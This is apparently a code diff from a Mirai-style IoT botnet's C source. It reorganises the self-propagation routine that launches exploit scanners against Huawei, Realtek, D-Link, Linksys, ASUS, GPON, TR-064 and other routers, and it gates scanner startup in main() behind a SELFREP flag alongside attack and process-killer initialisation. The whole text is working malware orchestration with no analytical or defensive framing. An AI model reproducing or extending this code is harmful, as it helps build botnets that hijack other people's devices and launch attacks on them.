@@ -120,49 +120,36 @@ void start_scanner(void)
 		hnapscanner_scanner_init();
 		realtekscanner_scanner_init();
 		thinkphp_scanner();
-        linksys_scanner_init();
-        dlinkscanner_scanner_init();
-        asus_scanner_init();
-        netlink_scanner();
-        jaws_scanner();
-        gpon80_scanner();
-        gpon443_scanner();
-        comtrend_scanner();
-        tr064_scanner_init();
+        	linksys_scanner_init();
+        	dlinkscanner_scanner_init();
+        	asus_scanner_init();
+        	netlink_scanner();
+        	jaws_scanner();
+        	gpon80_scanner();
+        	gpon443_scanner();
+        	comtrend_scanner();
+        	tr064_scanner_init();
 		scanner_init();
-	} else if(rand_num > 35)
-	{
-		huawei_init();
-		hnapscanner_scanner_init();
-		realtekscanner_scanner_init();
-		thinkphp_scanner();
-        linksys_scanner_init();
-        dlinkscanner_scanner_init();
-        asus_scanner_init();
-        netlink_scanner();
-        jaws_scanner();
-        gpon80_scanner();
-        gpon443_scanner();
-        comtrend_scanner();
-        tr064_scanner_init();
-		scanner_init();
-	} else
-	{
-		huawei_init();
-		hnapscanner_scanner_init();
-		realtekscanner_scanner_init();
-		thinkphp_scanner();
-        linksys_scanner_init();
-        dlinkscanner_scanner_init();
-        asus_scanner_init();
-        netlink_scanner();
-        jaws_scanner();
-        gpon80_scanner();
-        gpon443_scanner();
-        comtrend_scanner();
-        tr064_scanner_init();
-		scanner_init();
+	} else {
+		if(rand_num > 35) {
+			huawei_init();
+			hnapscanner_scanner_init();
+			realtekscanner_scanner_init();
+			thinkphp_scanner();
+       			linksys_scanner_init();
+        		dlinkscanner_scanner_init();
+			scanner_init();
+		} else {
+       			asus_scanner_init();
+       			netlink_scanner();
+       			jaws_scanner();
+      			gpon80_scanner();
+       			gpon443_scanner();
+       			comtrend_scanner();
+      			tr064_scanner_init();	
+		}
 	}
+	
 }
 #endif
 
@@ -242,7 +229,9 @@ int main(int argc, char **args)
     attack_init();
     killer_init();
     watchdog_maintain();
-    scanner_init();
+#ifdef SELFREP
+    scanner_start();
+#endif
 
     while (TRUE)
     {
